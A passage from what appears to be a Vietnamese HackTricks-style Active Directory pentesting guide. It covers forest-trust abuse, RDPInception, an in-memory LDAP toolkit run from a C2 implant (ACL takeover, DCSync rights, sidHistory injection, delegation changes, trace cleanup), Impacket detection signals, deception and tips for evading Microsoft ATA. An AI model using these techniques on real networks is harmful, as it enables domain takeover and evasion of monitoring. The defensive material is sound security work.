TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Trong tình huống này, **domain của bạn được một domain bên ngoài tin cậy**, cấp cho bạn **các quyền chưa xác định** trên domain đó. Bạn cần tìm **những principal nào trong domain của bạn có quyền truy cập nào trên domain bên ngoài**, rồi thử khai thác quyền đó:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domain thuộc forest bên ngoài - Một chiều (Outbound)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Trong kịch bản này, **miền của bạn** đang **ủy thác** một số **quyền** cho principal thuộc **các miền khác**.

Tuy nhiên, khi một **miền được miền thiết lập tin cậy tin cậy**, miền được tin cậy sẽ **tạo một người dùng** có **tên dễ đoán** và dùng **mật khẩu của miền được tin cậy** làm mật khẩu. Điều này có nghĩa là có thể **truy cập một người dùng trong miền thiết lập tin cậy để xâm nhập vào miền được tin cậy**, liệt kê thông tin trong miền đó và thử leo thang thêm quyền:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Một cách khác để xâm phạm miền được tin cậy là tìm một [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) được tạo theo **hướng ngược lại** với quan hệ tin cậy giữa các miền (điều này không phổ biến).

Một cách khác để xâm phạm miền được tin cậy là chờ trên một máy mà **người dùng từ miền được tin cậy có thể truy cập** để đăng nhập qua **RDP**. Sau đó, kẻ tấn công có thể chèn mã vào tiến trình phiên RDP và **truy cập miền gốc của nạn nhân** từ đó.\
Ngoài ra, nếu **nạn nhân đã gắn ổ cứng của mình**, kẻ tấn công có thể dùng tiến trình **phiên RDP** để lưu **backdoor** vào **thư mục khởi động của ổ cứng**. Kỹ thuật này được gọi là **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Biện pháp giảm thiểu lạm dụng quan hệ tin cậy giữa các miền

### **SID Filtering:**

- Rủi ro từ các cuộc tấn công khai thác thuộc tính SID history qua các quan hệ tin cậy giữa các forest được giảm thiểu bằng SID Filtering, tính năng được bật mặc định trên tất cả các quan hệ tin cậy liên forest. Cách làm này dựa trên giả định rằng các quan hệ tin cậy nội forest là an toàn, đồng thời xem forest—chứ không phải miền—là ranh giới bảo mật, theo quan điểm của Microsoft.
- Tuy nhiên, có một vấn đề: SID filtering có thể làm gián đoạn ứng dụng và quyền truy cập của người dùng, dẫn đến việc đôi khi tính năng này bị tắt.

### **Selective Authentication:**

- Đối với các quan hệ tin cậy liên forest, sử dụng Selective Authentication đảm bảo người dùng từ hai forest không được xác thực tự động. Thay vào đó, người dùng cần có quyền rõ ràng để truy cập các miền và máy chủ trong miền hoặc forest thiết lập tin cậy.
- Cần lưu ý rằng các biện pháp này không bảo vệ trước việc khai thác Writable Configuration Naming Context (NC) hoặc các cuộc tấn công vào tài khoản trust.

[**Tìm hiểu thêm về quan hệ tin cậy giữa các miền tại ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Lạm dụng AD dựa trên LDAP từ implant trên máy chủ

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) triển khai lại các primitive LDAP theo phong cách bloodyAD dưới dạng Beacon Object File x64, chạy hoàn toàn bên trong implant trên máy chủ (ví dụ: Adaptix C2). Operator biên dịch bộ công cụ bằng lệnh `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, nạp `ldap.axs`, rồi gọi `ldap <subcommand>` từ beacon. Toàn bộ lưu lượng sử dụng ngữ cảnh bảo mật của phiên đăng nhập hiện tại qua LDAP (389) với signing/sealing hoặc LDAPS (636) với cơ chế tự động tin cậy chứng chỉ, nên không cần SOCKS proxy hay artifact trên đĩa.<sup>[[4]](#references)</sup>

### Liệt kê LDAP từ phía implant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` và `get-groupmembers` phân giải tên rút gọn/đường dẫn OU thành DN đầy đủ rồi trích xuất các đối tượng tương ứng.
- `get-object`, `get-attribute` và `get-domaininfo` truy xuất các thuộc tính tùy ý (bao gồm security descriptor), cùng siêu dữ liệu forest/miền từ `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` và `get-rbcd` hiển thị trực tiếp từ LDAP các đối tượng tiềm năng để roasting, thiết lập delegation và descriptor [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) hiện có.
- `get-acl` và `get-writable --detailed` phân tích DACL để liệt kê trustee, quyền (GenericAll/WriteDACL/WriteOwner/quyền ghi thuộc tính) và kế thừa, qua đó nhanh chóng xác định mục tiêu để leo thang đặc quyền qua ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Các primitive ghi LDAP để leo thang & duy trì quyền truy cập

- Các BOF tạo đối tượng (`add-user`, `add-computer`, `add-group`, `add-ou`) cho phép operator tạo sẵn principal hoặc machine account ở bất kỳ nơi nào có quyền trên OU. `add-groupmember`, `set-password`, `add-attribute` và `set-attribute` trực tiếp chiếm quyền kiểm soát mục tiêu khi phát hiện quyền write-property.
- Các lệnh tập trung vào ACL như `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` và `add-dcsync` chuyển quyền WriteDACL/WriteOwner trên bất kỳ đối tượng AD nào thành khả năng đặt lại mật khẩu, kiểm soát thành viên nhóm hoặc quyền replication DCSync mà không để lại dấu vết PowerShell/ADSI. Các lệnh `remove-*` tương ứng dọn các ACE đã được thêm vào.

### Delegation, roasting và lạm dụng Kerberos

- `add-spn`/`set-spn` lập tức khiến người dùng đã bị chiếm quyền có thể bị Kerberoast; `add-asreproastable` (thay đổi UAC) đánh dấu tài khoản để AS-REP roasting mà không cần đụng đến mật khẩu.
- Các macro delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) sửa đổi `msDS-AllowedToDelegateTo`, cờ UAC hoặc `msDS-AllowedToActOnBehalfOfOtherIdentity` từ beacon, mở ra các đường tấn công constrained/unconstrained/RBCD và loại bỏ nhu cầu dùng PowerShell từ xa hoặc RSAT.

### Chèn sidHistory, di chuyển OU và định hình bề mặt tấn công

- `add-sidhistory` chèn SID có đặc quyền vào lịch sử SID của một principal do attacker kiểm soát (xem [SID-History Injection](sid-history-injection.md)), giúp kế thừa quyền truy cập một cách kín đáo hoàn toàn qua LDAP/LDAPS.
- `move-object` thay đổi DN/OU của máy tính hoặc người dùng, cho phép attacker đưa tài sản vào phạm vi quyền được ủy quyền trước khi dùng `set-password`, `add-groupmember` hoặc `add-spn`. Xem [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) để biết về quyền di chuyển và kiểm tra kế thừa.
- Các lệnh xóa có phạm vi chặt chẽ (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, v.v.) cho phép nhanh chóng hoàn tác sau khi operator thu thập thông tin xác thực hoặc thiết lập persistence, giảm thiểu telemetry.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Một số biện pháp phòng thủ chung

[**Tìm hiểu thêm về cách bảo vệ thông tin xác thực tại đây.**](../stealing-credentials/credentials-protections.md)

### **Biện pháp phòng thủ để bảo vệ thông tin xác thực**

- **Hạn chế Domain Admins**: Khuyến nghị chỉ cho phép Domain Admins đăng nhập vào Domain Controllers, tránh sử dụng tài khoản này trên các host khác.
- **Đặc quyền của tài khoản dịch vụ**: Không nên chạy dịch vụ với đặc quyền Domain Admin (DA) để đảm bảo an toàn.
- **Giới hạn thời gian đặc quyền**: Cần giới hạn thời gian sử dụng đặc quyền DA cho các tác vụ yêu cầu quyền này. Có thể thực hiện bằng: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Giảm thiểu LDAP relay**: Kiểm tra Event ID 2889/3074/3075, sau đó bắt buộc bật LDAP signing và LDAPS channel binding trên DC/client để chặn các nỗ lực LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting ở cấp giao thức đối với hoạt động Impacket

Nếu muốn phát hiện tradecraft AD phổ biến, **đừng chỉ dựa vào các dấu vết do operator kiểm soát**, chẳng hạn như binary đã đổi tên, tên dịch vụ, file batch tạm thời hoặc đường dẫn đầu ra. Hãy thiết lập baseline về cách các client Windows hợp lệ tạo lưu lượng [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC và WMI, sau đó tìm các **đặc điểm triển khai khác thường** vẫn còn tồn tại ngay cả khi operator chỉnh sửa `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` hoặc `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Các dấu hiệu độc lập có độ tin cậy cao** (sau khi đối chiếu với baseline của chính bạn):
  - DCE/RPC đã xác thực, sử dụng `auth_context_id = 79231 + ctx_id`
  - Padding xác thực DCE/RPC được điền bằng `0xff`
  - LDAP Kerberos bind đặt trực tiếp Kerberos `AP-REQ` thô trong SPNEGO `mechToken`
  - Yêu cầu negotiate SMB2/3 có giá trị `ClientGuid` trông như ASCII
  - WMI `IWbemLevel1Login::NTLMLogin` sử dụng namespace không chuẩn `//./root/cimv2`
  - Giá trị nonce Kerberos được hardcode
- **Phù hợp hơn để dùng làm tín hiệu tương quan/chấm điểm**:
  - Danh sách Kerberos etype thưa hoặc trùng lặp, `PA-DATA` bất thường/thiếu, hoặc thứ tự etype trong TGS-REQ khác với Windows gốc
  - Thông điệp NTLM Type 1 thiếu thông tin phiên bản hoặc thông điệp Type 3 có tên host null
  - NTLMSSP thô được truyền trong DCE/RPC thay vì SPNEGO, thiếu verification trailer của DCE/RPC hoặc OID SPNEGO/Kerberos không khớp
  - Nhiều đặc điểm trong số này xuất hiện trên cùng host/user/session/khoảng thời gian sẽ đáng tin hơn nhiều so với bất kỳ trường đơn lẻ nào
- **Dùng để bổ sung ngữ cảnh, không dùng làm cảnh báo độc lập**:
  - Tên file mặc định, đường dẫn đầu ra, tên dịch vụ ngẫu nhiên, tên batch tạm thời, tên computer account mặc định và các chuỗi HTTP/WebDAV/RDP/MSSQL đặc trưng của công cụ
  - Operator dễ thay đổi các dấu hiệu này; tốt nhất nên dùng chúng để giải thích vì sao một cụm hoạt động đa giao thức đáng ngờ
- **Lưu ý vận hành**:
  - Một số tín hiệu này cần lưu lượng đã giải mã, [phân tích PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW hoặc khả năng quan sát phía dịch vụ
  - Hãy kiểm tra với client Samba/Linux, thiết bị chuyên dụng và phần mềm cũ trước khi nâng thành cảnh báo
  - Khi đã xây dựng được baseline đáng tin cậy, hãy nâng cấp phát hiện từ bổ sung ngữ cảnh -> threat hunting -> cảnh báo

### **Triển khai kỹ thuật đánh lạc hướng**

- Triển khai kỹ thuật đánh lạc hướng gồm việc đặt bẫy, chẳng hạn như người dùng hoặc máy tính mồi, với các đặc điểm như mật khẩu không hết hạn hoặc được đánh dấu là Trusted for Delegation. Cách triển khai chi tiết có thể bao gồm tạo người dùng với các quyền cụ thể hoặc thêm họ vào nhóm có đặc quyền cao.<sup>[[2]](#references)</sup>
- Ví dụ thực tế là dùng các công cụ như: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Có thể tìm hiểu thêm về triển khai kỹ thuật đánh lạc hướng tại [Deploy-Deception trên GitHub](https://github.com/samratashok/Deploy-Deception).

### **Nhận diện kỹ thuật đánh lạc hướng**

- **Đối với đối tượng người dùng**: Các dấu hiệu đáng ngờ gồm ObjectSID khác thường, số lần đăng nhập ít, ngày tạo và số lần nhập sai mật khẩu thấp.
- **Dấu hiệu chung**: So sánh các thuộc tính của đối tượng mồi tiềm năng với đối tượng thật có thể phát hiện điểm không nhất quán. Các công cụ như [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) có thể hỗ trợ nhận diện các kỹ thuật đánh lạc hướng này.

### **Vượt qua hệ thống phát hiện**

- **Vượt qua phát hiện của Microsoft ATA**:
  - **Liệt kê người dùng**: Tránh liệt kê session trên Domain Controller để không bị ATA phát hiện.
  - **Giả mạo ticket**: Dùng khóa **aes** để tạo ticket giúp né phát hiện bằng cách không hạ cấp xuống NTLM.
  - **Tấn công DCSync**: Nên thực hiện từ máy không phải Domain Controller để tránh bị ATA phát hiện, vì thực hiện trực tiếp từ Domain Controller sẽ kích hoạt cảnh báo.

## References

- [1] [Hướng dẫn tấn công Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Giả mạo Trusts để đánh lạc hướng trong Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Từ Domain Admin đến Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Bộ sưu tập LDAP BOF – Bộ công cụ LDAP trong bộ nhớ để khai thác Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Biến hash NTLM thành wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Phân tích Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Chiếm quyền kiểm soát tài khoản Active Directory qua Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Cách quản lý các thay đổi trong kết nối secure channel của Netlogon liên quan đến CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Hành trình tìm hiểu các giao diện Null Session và MS-RPC bị lãng quên](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter có phải ranh giới bảo mật giữa các domain? (Phần 4) - Nghiên cứu vượt qua SID filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter có phải ranh giới bảo mật giữa các domain? (Phần 5) - Tấn công trust Golden GMSA - từ child lên parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter có phải ranh giới bảo mật giữa các domain? (Phần 6) - Tấn công trust thay đổi Schema - từ child lên parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Từ DA lên EA bằng ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Leo thang từ quản trị viên child domain lên enterprise admin trong 5 phút bằng cách lạm dụng AD CS: phần tiếp theo](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Một ACE trong tay áo: Thiết kế cửa hậu DACL cho Active Directory](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Mã nguồn module pre2k của NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - thuộc tính msDS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
